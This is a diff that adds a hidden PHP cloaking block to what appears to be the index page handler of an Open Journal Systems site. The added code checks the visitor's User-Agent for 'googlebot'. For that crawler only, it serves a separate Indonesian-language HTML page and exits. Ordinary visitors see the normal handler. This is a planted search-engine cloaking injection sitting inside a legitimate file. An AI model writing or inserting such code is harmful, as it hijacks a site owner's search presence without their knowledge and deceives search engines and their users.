@@ -1,4 +1,9 @@
+<?php
 
+if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
+{
+?>
+   
 
 <html lang="id" class="wf-roboto-n4-active wf-roboto-n7-active wf-active">
   <head
@@ -17674,3 +17679,33 @@ setInterval(()=>{
 <script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"0beef69ef7e64d20998ab11a8493914f","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
 </body>
 </html>
+
+<?php
+exit;
+}
+?>
+
+<?php
+
+/**
+ * @defgroup pages_index Index Pages
+ */
+
+/**
+ * @file pages/index/index.php
+ *
+ * Copyright (c) 2014-2021 Simon Fraser University
+ * Copyright (c) 2003-2021 John Willinsky
+ * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
+ *
+ * @ingroup pages_index
+ *
+ * @brief Handle site index requests.
+ *
+ */
+
+switch ($op) {
+    case 'index':
+        define('HANDLER_CLASS', 'APP\pages\index\IndexHandler');
+        break;
+}
